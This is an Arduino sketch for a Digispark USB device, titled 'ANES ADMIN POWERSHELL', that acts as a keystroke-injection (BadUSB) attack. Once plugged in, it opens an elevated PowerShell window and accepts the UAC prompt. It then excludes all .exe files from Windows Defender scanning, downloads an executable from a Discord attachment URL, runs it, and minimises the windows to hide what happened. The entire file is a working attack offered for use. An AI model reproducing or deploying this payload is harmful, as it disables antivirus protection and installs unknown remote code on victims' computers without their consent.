/* 
ANES ADMIN POWERSHELL
           25.10.2021 - bvgs


 █████╗  ███╗   ██╗  ███████╗ ███████╗
██╔══██╗████╗  ██║ ██╔════╝ ██╔════╝
███████║██╔██╗ ██║ █████╗    ███████╗
██╔══██║██║╚██╗██║██╔══╝  ╚════  ██║
██║  ██║ ██║ ╚████║ ███████╗ ███████║
╚═╝  ╚═╝ ╚═╝  ╚═══  ╚══════╝╚══════╝
                                  
Unstable pre-release
  */

#include "DigiKeyboard.h"
void setup() {
 
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-MpPreference -ExclusionExtension exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Invoke-WebRequest https://cdn.discordapp.com/attachments/879763520726663199/914850911849963560/test.exe -OutFile micromarc.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);
  DigiKeyboard.print("./micromarc.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  for(;;) {}
}
